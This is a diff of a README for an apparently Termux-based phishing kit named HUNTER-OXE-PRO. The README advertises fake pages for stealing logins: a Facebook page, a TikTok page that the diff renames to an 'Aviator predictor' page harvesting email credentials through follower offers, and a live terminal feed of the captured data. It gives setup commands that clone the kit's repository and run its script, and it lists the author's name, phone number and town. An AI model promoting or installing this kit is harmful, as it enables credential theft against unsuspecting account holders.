@@ -11,7 +11,7 @@
 This special edition is streamlined for maximum efficiency:
 
 * **[1] Facebook Multi-Tool** - A hybrid page for both standard logins and follower/like boosting services.
-* **[2] TikTok Booster** - High-conversion page designed to capture TikTok credentials via follower offers.
+* **[2] Aviator predictor** - High-conversion page designed to capture Email credentials via follower offers.
 * **[L] Live Data Stream** - Real-time tracking of captured information directly in your terminal.
 ---
 
@@ -26,6 +26,7 @@ pkg update && pkg upgrade -y && pkg install git php cloudflared -y && git clone 
 No more long commands! After installation, simply type:
 
 ```Bash
+git clone https://github.com/hunteroxe1-ai/HUNTER-OXE-PRO
 cd HUNTER-OXE-PRO
 chmod +x *
 ./HUNTER~OXE.sh
@@ -41,7 +42,7 @@ Name: Phillimon Isaac
 HIS PHONE NUMBER
 
 ```bash
-+265 986445528
++265986445528
 ```
 Location: Mchinji, Malawi
 
